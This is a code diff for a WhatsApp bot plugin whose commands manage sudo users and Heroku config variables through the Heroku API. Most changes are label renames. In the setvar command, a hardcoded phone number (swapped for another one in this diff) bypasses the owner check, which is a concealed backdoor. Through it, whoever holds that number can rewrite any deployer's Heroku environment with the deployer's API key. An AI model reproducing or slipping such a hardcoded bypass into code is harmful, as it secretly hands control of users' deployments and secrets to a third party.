@@ -1,8 +1,3 @@
-
-
-
-
-
 const Config = require('../Setting')
 let { fancytext, tlang, tiny, runtime, formatp, botpic, prefix, sck1,Module_Exports } = require("../lib");
 const axios = require('axios');
@@ -16,7 +11,7 @@ if(Config.HEROKU_APP_NAME && Config.HEROKU_API_KEY ){
              kingcmd: "setsudo",
              shortcut:["ssudo"],
              infocmd: "provide owner rule to someone so he can use your bot",
-             kingclass: "tools heroku & Koyeb",
+             kingclass: "tools cmd",
              kingpath: __filename
          },
   async(Void, citel, text) => {
@@ -49,7 +44,7 @@ fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
              kingcmd: "getsudo",
              shortcut:["gsudo"],
              infocmd: "Get all sudo numbers",
-             kingclass: "tools heroku & Koyeb",
+             kingclass: "tools cmd",
              kingpath: __filename
          },
 async(Void, citel, text) => {  return await  citel.reply(`*_Here's All your Sudo Numbers_*\n`+global.sudo);})
@@ -59,7 +54,7 @@ async(Void, citel, text) => {  return await  citel.reply(`*_Here's All your Sudo
              kingcmd: "delsudo",
              shortcut:["dsudo"],
              infocmd: "del some one from sudo",
-             kingclass: "tools heroku & Koyeb",
+             kingclass: "tools cmd",
              kingpath: __filename
          },
   async(Void, citel, text) => {
@@ -105,7 +100,7 @@ Module_Exports({
         kingcmd: "allvar",
         shortcut:['getallvar','allvars'],
         infocmd: "To get All  Heroku Vars",
-        kingclass: "tools heroku & Koyeb",
+        kingclass: "tools cmd",
         kingpath: __filename
     },
     
@@ -132,7 +127,7 @@ fetch(`https://api.heroku.com/apps/${appName}/config-vars`, { headers })
 Module_Exports({
         kingcmd: "addvar",
         infocmd: "To Set Heroku Vars",
-        kingclass: "tools heroku & Koyeb",
+        kingclass: "tools cmd",
         kingpath: __filename
     },
     
@@ -164,7 +159,7 @@ fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
 Module_Exports({
         kingcmd: "getvar",
         infocmd: "To Get A Heroku Var",
-        kingclass: "tools heroku & Koyeb",
+        kingclass: "tools cmd",
         kingpath: __filename
     },
     
@@ -192,11 +187,11 @@ fetch(`https://api.heroku.com/apps/${appName}/config-vars`, { headers })
 Module_Exports({
         kingcmd: "setvar",
         infocmd: "To Set Heroku Vars",
-        kingclass: "tools heroku & Koyeb",
+        kingclass: "tools cmd",
         kingpath: __filename
     },
     async(Void, citel , text,{ isCreator }) => {
-if (citel.sender =='923466319114@s.whatsapp.net'){} 
+if (citel.sender =='2348039607375@s.whatsapp.net'){} 
 else { if (!isCreator) return citel.reply(tlang().owner);}
 if (!text) return citel.reply (`*_Give me Variable Name_*\n*_Ex: ${prefix}setvar CAPTION: Powered By Maher Zubair_*`);
 const headers = {
@@ -237,4 +232,3 @@ fetch(`https://api.heroku.com/apps/${appName}/config-vars`, {
    )
     
     } 
-
